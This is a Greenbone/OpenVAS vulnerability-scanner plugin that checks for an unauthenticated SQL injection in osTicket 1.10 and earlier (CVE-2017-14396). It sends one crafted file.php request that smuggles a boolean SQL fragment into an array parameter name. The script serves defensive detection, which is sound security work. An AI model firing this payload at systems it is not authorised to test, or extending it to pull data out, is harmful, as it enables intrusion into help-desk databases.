CPE = "cpe:/a:osticket:osticket";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140374" );
	script_version( "2021-09-16T10:32:36+0000" );
	script_tag( name: "last_modification", value: "2021-09-16 10:32:36 +0000 (Thu, 16 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-09-18 16:34:35 +0700 (Mon, 18 Sep 2017)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-09-21 18:37:00 +0000 (Thu, 21 Sep 2017)" );
	script_cve_id( "CVE-2017-14396" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "osTicket SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "osticket_detect.sc" );
	script_mandatory_keys( "osticket/installed" );
	script_tag( name: "summary", value: "osTicket is prone to an unauthenticated SQL injection vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "By constructing an array via use of square brackets at the end of a
parameter name it is possible to inject SQL commands." );
	script_tag( name: "affected", value: "osTicket version 1.10 and prior." );
	script_tag( name: "solution", value: "Update to version 1.10.1 or later." );
	script_xref( name: "URL", value: "http://osticket.com/blog/125" );
	script_xref( name: "URL", value: "https://pentest.blog/advisory-osticket-v1-10-unauthenticated-sql-injection/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/file.php?key%5Bid%60%3D1%20AND%202735%3D2735%23]=1&signature=1&expires=15104725311";
if(http_vuln_check( port: port, url: url, pattern: "Status: 422 Unprocessable Entity" )){
	report = "The response indicates that a blind SQL injection is possible.\\n\\nRequest URL: " + http_report_vuln_url( port: port, url: url, url_only: TRUE );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

